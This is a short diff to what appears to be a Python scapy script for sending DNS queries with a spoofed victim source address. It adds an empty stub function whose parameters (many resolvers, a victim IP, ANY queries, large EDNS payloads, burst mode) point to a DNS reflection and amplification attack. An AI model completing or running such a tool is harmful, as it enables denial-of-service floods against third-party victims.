@@ -60,3 +60,14 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
         if measure:
             print(f"Query size: {len(pkt)} bytes")
     scapy_send(pkt, verbose=False)
+
+
+def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
+                                           victim_ip, victim_src_port=53,
+                                           num_queries=1, interval=1.0,
+                                           qtype='ANY', edns_payload=4096,
+                                           dnssec_do=False, txid=0x1337,
+                                           id_random=False, verbose=False,
+                                           measure=False, burst=False,
+                                           qclass=1):
+    pass
